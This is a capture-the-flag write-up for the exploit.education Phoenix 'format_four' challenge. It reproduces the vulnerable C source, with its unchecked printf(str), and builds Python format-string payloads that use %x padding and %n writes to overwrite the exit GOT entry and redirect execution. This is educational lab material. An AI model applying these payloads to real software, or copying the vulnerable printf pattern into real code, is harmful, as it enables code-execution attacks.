---
title: Phoenix - format_four 
date: 2026-06-15 00:00:00 +0800
categories: [PWN]
tags:      # TAG names should always be lowercase
description: Phoenix format_four ctf
toc: true
---

## Introduction
I will be explaining how i did the challenge format_four from the series Phoenix found at <https://exploit.education/phoenix/format-four/>

## Step one
Firstly, i inspect the source code, this time i will be exploiting the function __printf__:

```

/*
 * phoenix/format-four, by https://exploit.education
 *
 * Can you affect code execution? Once you've got congratulations() to
 * execute, can you then execute your own shell code?
 *
 * Did you get a hair cut?
 * No, I got all of them cut.
 *
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

void bounce(char *str) {
  printf(str);
  exit(0);
}

void congratulations() {
  printf("Well done, you're redirected code execution!\n");
  exit(0);
}

int main(int argc, char **argv) {
  char buf[4096];

  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);
}

```

The goal of this challenge is to overwrite the GOT address of the __exit__ function with that of __congratulations__. 


## Step two - determining __exit__ address 

Firstly, i need to retrieve the memory address of the __exit__ function. This can be found by running `objump -R format_four.elf`. 

![](assets/posts/PWN/phoenix_format_four/exit_addr.png)

Secondly, i need to determine the base address of the executable which can be found by running `info proc mappings` in gdb. 

![](assets/posts/PWN/phoenix_format_four/procmap.png)

As the base address is `0x56555000`, i need to add `0x00004010` which gives `0x56559010` , hence my current payload looks like this:

```
import sys
changeme = b"\x10\x90\x55\x56"
changeme += b"\x11\x90\x55\x56"
changeme += b"\x12\x90\x55\x56"
changeme += b"\x13\x90\x55\x56"
```

## Step three - determine where my input is located
I need to set a breakpoint before __printf__ in __bounce__ to determine where my input is stored on the stack. 

![](assets/posts/PWN/phoenix_format_four/stack.png)

Based on the image above, it is located at an offset of 11 bytes. Hence i will add `%x` 11 times in my payload. Afterwards i will add `%n` to write to `0x56559010` which allows me to check how many bytes are counted so far. 

```
import sys
changeme = b"\x10\x90\x55\x56"
changeme += b"%x" * 11
changeme += b"%n"

sys.stdout.buffer.write(changeme)
```

When running the payload, set a breakpoint at __exit___ in the __bounce__ function. This allows me to view the value of `0x56559010` which indicates the remaining number of "junk" bytes to write. 

![](assets/posts/PWN/phoenix_format_four/works.png)

## Step four - set payload
Repeat what was done previously for phoenix format three except that the number of bytes to write should correspond to the address of __congratulations__ . This gives me a payload of

```
import sys
changeme = b"\x10\x90\x55\x56"
changeme += b"\x11\x90\x55\x56"
changeme += b"\x12\x90\x55\x56"
changeme += b"\x13\x90\x55\x56"
#changeme = b"AAAA"
changeme += b"%x" * 11
#changeme += b"%n"

changeme += b"A"*130
changeme += b"%n"

changeme += b"A" * 138
changeme += b"%n"

changeme += b"A" * 244
changeme += b"%n"

changeme += b"A" * 1
changeme += b"%n"

#changeme += b"A" *115
#changeme += b"%n"
sys.stdout.buffer.write(changeme)
```
After running the payload, i can see that the payload works as shown below.

![](assets/posts/PWN/phoenix_format_four/flag.png)

